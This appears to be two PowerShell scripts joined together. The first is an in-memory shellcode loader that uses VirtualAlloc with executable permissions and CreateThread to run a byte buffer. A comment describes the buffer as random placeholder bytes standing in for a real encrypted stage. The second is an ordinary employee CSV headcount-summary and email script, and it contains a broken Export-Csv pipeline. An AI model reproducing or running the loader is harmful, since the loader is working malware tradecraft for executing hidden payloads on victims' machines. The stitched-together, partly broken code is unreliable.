
[CmdletBinding()]
param(
    [string]$LogPath = "$env:TEMP\loader.log"
)

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class MemoryApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x84, 0x49, 0xea, 0x74, 0x03, 0xec, 0xa6, 0x4e, 0x3b, 0x1c, 0x64, 0x03, 0x1b, 0x60, 0xc3, 0x24,
    0x2f, 0xcf, 0x71, 0xc3, 0x2a, 0xbb, 0xf3, 0x26, 0xf7, 0x0d, 0x65, 0x00, 0x9b, 0x77, 0x8d, 0xf8,
    0xef, 0x95, 0x4e, 0x91, 0x82, 0x1c, 0x34, 0x90, 0x93, 0x56, 0x40, 0xdd, 0xf0, 0x9c, 0x12, 0x9d,
    0xca, 0xcd, 0xcc, 0x44, 0x2c, 0x3c, 0xbb, 0x37, 0x62, 0x51, 0xee, 0xb0, 0x5f, 0x18, 0x08, 0xd7,
    0x80, 0x0d, 0x4e, 0x81, 0xb1, 0x55, 0x78, 0x37, 0x0d, 0xd7, 0xa1, 0xa5, 0x99, 0xeb, 0x3f, 0xd0,
    0xc9, 0x6e, 0x85, 0x19, 0x5f, 0xe3, 0x71, 0xe2, 0x86, 0xec, 0xff, 0x3e, 0xe0, 0x54, 0xc0, 0x8a,
    0x4a, 0x30, 0x78, 0xcd, 0xdc, 0x66, 0xba, 0xb9, 0x16, 0xaa, 0xe3, 0x36, 0x78, 0x87, 0x3a, 0x39,
    0xa4, 0x28, 0x4e, 0xd5, 0x07, 0xc9, 0x58, 0xc7, 0xbe, 0x16, 0xd4, 0xfa, 0x91, 0xac, 0x37, 0xf4,
    0xc2, 0x17, 0xb6, 0xf7, 0x7e, 0xa4, 0x4e, 0x7c, 0xd3, 0x77, 0x16, 0xf4, 0x7e, 0x43, 0xf8, 0xad,
    0x1a, 0xb2, 0xc2, 0x4c, 0xfe, 0xbe, 0xb2, 0x86, 0xea, 0x61, 0x6e, 0x8e, 0x66, 0x8e, 0x92, 0xda,
    0x11, 0xa8, 0x75, 0x50, 0x23, 0xc0, 0xc5, 0xc4, 0x59, 0x88, 0x4d, 0x8e, 0x47, 0x54, 0x0a, 0xee,
    0x8f, 0x5e, 0x50, 0x08, 0xc9, 0x8e, 0xfb, 0xb4, 0x2f, 0x0e, 0x10, 0xde, 0xcb, 0x09, 0x30, 0x0e,
    0x29, 0xc6, 0x7a, 0x0f, 0x3d, 0xdc, 0x82, 0x18, 0xe3, 0xca, 0xfd, 0x1e, 0xcb, 0xf3, 0xff, 0x53,
    0x1f, 0x50, 0xaa, 0x08, 0xa8, 0x5c, 0x4f, 0xdf, 0x82, 0xcd, 0x84, 0x98, 0x4a, 0x88, 0x74, 0xf6,
    0xa8, 0x28, 0xd4, 0x12, 0xda, 0x27, 0x7a, 0x3b, 0x07, 0x52, 0x02, 0xe9, 0x99, 0x3a, 0x17, 0x7d,
    0xde, 0xd8, 0x79, 0xcb, 0x2e, 0xc1, 0xfe, 0x3e, 0xde, 0x57, 0x14, 0x91, 0xc4, 0x9e, 0x82, 0x84,
    0x36, 0x88, 0x19, 0x98, 0x43, 0x56, 0x33, 0xc5, 0x81, 0xe0, 0xba, 0xcd, 0x2a, 0xb4, 0x32, 0x4d,
    0xf6, 0x1b, 0xe2, 0x3c, 0xd5, 0x99, 0x9b, 0x3e, 0x6b, 0x31, 0x08, 0x37, 0x0f, 0xe4, 0x73, 0x48,
    0x14, 0x2c, 0x9d, 0x7e, 0x2e, 0xfb, 0xfa, 0x67, 0x57, 0xa3, 0x51, 0x1f, 0xfb, 0xf6, 0xf6, 0x5d,
    0x9d, 0x3c, 0x5b, 0xda, 0xe1, 0x1f, 0xd1, 0xff, 0x4f, 0x76, 0x10, 0xd0, 0x74, 0xd7, 0x4b, 0x99,
    0x29, 0xc0, 0x2b, 0x3b, 0x8f, 0x70, 0x31, 0xed, 0x31, 0x93, 0xc1, 0x02, 0x2a, 0x85, 0xa0, 0xd1,
    0x35, 0xb7, 0xa0, 0xa4, 0x66, 0x44, 0xd9, 0x06, 0x1a, 0x05, 0xd4, 0x08, 0x8e, 0x28, 0x5a, 0x41
)

$MemoryHandle = [MemoryApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($MemoryHandle -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $MemoryHandle, $Buffer.Length)
$ThreadId = 0
$Thread = [MemoryApi]::CreateThread([IntPtr]::Zero, 0, $MemoryHandle, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][MemoryApi]::WaitForSingleObject($Thread, 4962)
[void][MemoryApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
<#
.SYNOPSIS
    Reads an exported employee CSV and writes an aggregated summary report.
.EXAMPLE
    .\Convert-CsvSummary.ps1 -InputCsv D:\Incoming\employees.csv
.EXAMPLE
    .\Convert-CsvSummary.ps1 -GroupBy Site -MinAmount 10000
.NOTES
    Author: IT Systems
    Last updated: 2024-09-07
#>

[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$InputCsv = 'D:\Incoming\employees.csv',
    [string]$OutputPath = 'C:\Reports\headcount-summary-2024-08-16.csv',

    [Parameter(Mandatory = $false)]
    [ValidateSet('Department', 'Site')]
    [string]$GroupBy = "Department",
    [double]$MinAmount = 10000
)

$ErrorActionPreference = 'Stop'

$culture = [System.Globalization.CultureInfo]::InvariantCulture

if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ','
if (@($rows).Count -eq 0) {
    throw 'The input CSV contains no data rows.'
}
$required = @('EmployeeId', 'Name', 'Department', 'Site', 'Amount')
$available = $rows[0].PSObject.Properties.Name
$missing = @($required | Where-Object { $available -notcontains $_ })
if ($missing.Count -gt 0) {
    throw ("Missing column(s): {0}" -f ($missing -join ', '))
}
$rows | ForEach-Object { $_.Amount = [double]$_.Amount }

$byGroup = $rows | Group-Object -Property $GroupBy | ForEach-Object {
    $sum = ($_.Group | Measure-Object -Property Amount -Sum).Sum
    [pscustomobject]@{
        Group     = $_.Name
        Metric    = $GroupBy
        Employees = $_.Count
        Total     = [math]::Round($sum, 2)
        Average   = [math]::Round(($sum / $_.Count), 2)
    }
}

$grandTotal = [math]::Round((($rows | Measure-Object -Property Amount -Sum).Sum), 2)
$rowCount = @($rows).Count

$byGroup | Sort-Object -Property Total -Descending |
    -Path $OutputPath `
    -NoTypeInformation
$aboveThreshold = $byGroup | Where-Object { $_.Total -ge $MinAmount }
$aboveThreshold | Export-Csv -Path $OutputPath.Replace('.csv', '-filtered.csv') -NoTypeInformation -Encoding UTF8

$bySite = $rows | Group-Object -Property Site | ForEach-Object {
    [pscustomobject]@{
        Site      = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}
$bySite | Sort-Object -Property Total -Descending | Format-Table -AutoSize
$duplicates = $rows | Group-Object -Property EmployeeId |
    Where-Object { $_.Count -gt 1 } |
    Select-Object Name, Count
if (@($duplicates).Count -gt 0) {
    Write-Warning ("Duplicate employee ids: {0}" -f @($duplicates).Count)
}

$style = @'
<style>
body { font-family: Segoe UI; font-size: 13px; }
table { border-collapse: collapse; width: 100%; }
th { background: #e8eef7; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$byGroup | Sort-Object -Property Total -Descending |
    ConvertTo-Html -Title 'Headcount summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.csv', '.html') -Encoding UTF8
$jsonBody = $byGroup | ConvertTo-Json -Depth 4
$jsonBody | Set-Content -Path $OutputPath.Replace('.csv', '.json') -Encoding UTF8

$bySite | Export-Csv -Path $OutputPath.Replace('.csv', '-by-site.csv') -NoTypeInformation -Encoding UTF8
$summaryBody = @"
Rows processed : $rowCount
Grand total    : $grandTotal
Groups         : $($byGroup.Count)
Output         : $OutputPath
"@

$MailTo = 'reporting@contoso.com'
$MailFrom = 'bi@contoso.com'

Send-MailMessage `
    -To $MailTo `
    -From $MailFrom `
    -Subject "Headcount summary" `
    -Body $summaryBody `
    -SmtpServer 'smtp.contoso.com' `
    -Port 25 `
    -UseSsl

Write-Host ("Report written to {0}" -f $OutputPath) -ForegroundColor Green
Write-Verbose ("Filtered groups above threshold: {0}" -f @($aboveThreshold).Count)

$sample = $rows | Select-Object -First 3
$sample | Format-Table -AutoSize | Out-String | Write-Verbose

$byCostCenter = $rows | Where-Object { $_.PSObject.Properties.Name -contains 'CostCenter' } |
    Group-Object -Property CostCenter | Sort-Object -Property Count -Descending | Select-Object -First 5
$byCostCenter | Format-Table Name, Count -AutoSize

$culture = [System.Globalization.CultureInfo]::GetCultureInfo('en-US')
$formatted = $grandTotal.ToString('C2', $culture)
Write-Verbose ("Formatted total: {0}" -f $formatted)

$average = ($rows | Measure-Object -Property Amount -Average).Average
Write-Verbose ("Average amount: {0:N2}" -f $average)

$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}

$largest = $rows | Sort-Object -Property Amount -Descending | Select-Object -First 5
$largest | Format-Table Name, Department, Amount -AutoSize

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)
